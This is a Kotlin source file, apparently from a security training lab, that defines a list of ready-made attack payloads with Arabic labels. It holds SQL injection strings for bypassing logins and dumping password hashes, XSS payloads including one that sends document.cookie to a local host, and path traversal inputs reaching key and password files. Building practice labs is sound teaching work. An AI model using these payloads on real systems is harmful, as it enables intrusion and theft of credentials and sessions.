package com.spectre.osint.core.lab

// ════════════════════════════════════════════════════════════════
//  حمولات جاهزة لبيئة المختبر — نفس تقنيات الاختراق الحقيقية
// ════════════════════════════════════════════════════════════════
object LabPayloads {

    val sqli = listOf(
        "تجاوز المصادقة" to "admin' OR '1'='1",
        "تجاوز بالتعليق" to "admin'--",
        "استخراج عمود واحد" to "' UNION SELECT 1,2,3,4,5--",
        "استخراج جدول users" to "' UNION SELECT id,username,password_hash,email,role FROM users--",
        "كشف عدد الأعمدة" to "' ORDER BY 5--"
    )

    val xss = listOf(
        "تنبيه بسيط" to "<script>alert('XSS')</script>",
        "سرقة Cookie" to "<script>fetch('http://127.0.0.1:4/c='+document.cookie)</script>",
        "وسوم SVG" to "<svg onload=alert(1)>",
        "خطأ تحميل صورة" to "<img src=x onerror=alert('xss')>"
    )

    val traversal = listOf(
        "الملف السري 1" to "secret_router.txt",
        "الملف السري 2" to "api_keys.txt",
        "قاعدة كلمات المرور" to "passwords.txt",
        "تجاوز مجلد التطبيق" to "../api_keys.txt",
        "تجاوز من الجذر" to "../../lab_secrets/secret_router.txt"
    )
}
